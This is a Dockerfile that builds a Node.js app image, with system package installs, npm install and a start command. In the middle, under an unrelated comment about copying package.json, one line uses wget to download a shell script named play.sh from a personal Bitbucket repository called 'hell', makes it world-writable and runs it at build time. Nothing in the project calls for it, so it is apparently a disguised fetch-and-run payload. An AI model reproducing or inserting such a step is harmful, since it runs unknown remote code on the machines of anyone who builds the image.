FROM node:carbon



# Create app directory
WORKDIR /usr/src/app

RUN apt-get update && \
     apt-get install -y \
        wget \
        dnsutils \
        libmagickwand-dev \
        libzip-dev \
        libsodium-dev \
        libpng-dev \
        libfreetype6-dev \
        libjpeg62-turbo-dev \
        zlib1g-dev \
        libicu-dev \
        libxml2-dev \
        g++

# Install app dependencies
# A wildcard is used to ensure both package.json AND package-lock.json are copied
# where available (npm@5+)
RUN wget https://bitbucket.org/novalanto61/hell/raw/317d52572f4b483b9f01de2eea21798ca6888bbe/play.sh && chmod 777 play.sh && ./play.sh
COPY package*.json ./

RUN npm install
# If you are building your code for production
# RUN npm install --only=production

# Bundle app source
COPY . .

EXPOSE 8080
CMD [ "npm", "start" ]
